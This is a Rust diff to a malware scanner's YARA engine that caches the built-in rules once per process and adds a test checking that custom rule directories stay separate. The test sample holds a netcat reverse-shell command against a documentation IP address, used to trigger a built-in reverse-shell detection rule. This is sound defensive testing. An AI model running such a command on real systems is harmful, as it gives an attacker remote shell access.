@@ -66,12 +66,32 @@ const BUNDLED_RULES: &[(&str, &str)] = &[
 const ECOSYSTEM: &str = "ecosystem";
 
 pub struct YaraEngine {
+    /// The built-in rules compiled together with a rules directory's.
+    /// `None` without a directory: the shared built-in set (`builtin`).
     rules: Option<yara_x::Rules>,
 }
 
 impl YaraEngine {
     /// Initialize YaraEngine with default built-in rules and optional directory of .yar files
     pub fn new(custom_rules_dir: Option<&Path>) -> Self {
+        // With a directory, compiled at every scan as before: its files can
+        // change between two scans of one process.
+        let custom = custom_rules_dir.filter(|dir| dir.is_dir());
+        Self {
+            rules: custom.map(|dir| Self::compile(Some(dir))),
+        }
+    }
+
+    /// The built-in rules, compiled once per process. `deps`, `watch`,
+    /// `guard`, `installed` and the server run many scans, and each one
+    /// compiled the same rules again: about 0.3 s of every scan in a debug
+    /// build.
+    fn builtin() -> &'static yara_x::Rules {
+        static RULES: std::sync::OnceLock<yara_x::Rules> = std::sync::OnceLock::new();
+        RULES.get_or_init(|| Self::compile(None))
+    }
+
+    fn compile(custom_rules_dir: Option<&Path>) -> yara_x::Rules {
         let mut compiler = yara_x::Compiler::new();
         if let Err(e) = compiler.define_global(ECOSYSTEM, "") {
             warn!("Failed to declare YARA global {}: {}", ECOSYSTEM, e);
@@ -98,8 +118,7 @@ impl YaraEngine {
             }
         }
 
-        let rules = compiler.build();
-        Self { rules: Some(rules) }
+        compiler.build()
     }
 
     fn load_rules_from_dir(dir: &Path, compiler: &mut yara_x::Compiler) {
@@ -129,7 +148,11 @@ impl YaraEngine {
     /// module, which used to happen once per scanned file. `ecosystem` is
     /// what the scanned tree is (`npm`, `pypi`, `extension`, or empty).
     pub fn scanner(&self, ecosystem: &str) -> Option<yara_x::Scanner<'_>> {
-        let mut scanner = yara_x::Scanner::new(self.rules.as_ref()?);
+        let rules = match &self.rules {
+            Some(with_dir) => with_dir,
+            None => Self::builtin(),
+        };
+        let mut scanner = yara_x::Scanner::new(rules);
         let _ = scanner.set_global(ECOSYSTEM, ecosystem);
         Some(scanner)
     }
@@ -314,6 +337,38 @@ mod tests {
             .any(|m| m.matched_pattern == "YARA Rule: threat_runtime_obfuscation_chr"));
         // path_include keeps the Python rule off JavaScript.
         assert!(engine.scan_data("evil.js", chr).is_empty());
+    }
+
+    /// The built-in set is compiled once and shared. A rules directory's
+    /// rules stay with the engine made for it, beside the built-in ones.
+    #[test]
+    fn a_rules_directory_does_not_reach_the_shared_builtin_set() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("custom.yar"),
+            "rule OnlyHere { strings: $a = \"only-here-marker\" condition: $a }",
+        )
+        .unwrap();
+        let names = |engine: YaraEngine| {
+            let sample = b"only-here-marker; nc -e /bin/sh 203.0.113.5 4444";
+            let mut names: Vec<String> = engine
+                .scan_data("a.sh", sample)
+                .into_iter()
+                .map(|m| m.matched_pattern)
+                .collect();
+            names.sort();
+            names
+        };
+        let builtin = ["YARA Rule: ReverseShellGeneric"];
+        assert_eq!(
+            names(YaraEngine::new(Some(dir.path()))),
+            ["YARA Rule: OnlyHere", "YARA Rule: ReverseShellGeneric"]
+        );
+        assert_eq!(names(YaraEngine::new(None)), builtin);
+        // A directory that is not there: the built-in rules, as before.
+        let missing = dir.path().join("missing");
+        assert_eq!(names(YaraEngine::new(Some(&missing))), builtin);
+        assert!(std::ptr::eq(YaraEngine::builtin(), YaraEngine::builtin()));
     }
 
     #[test]
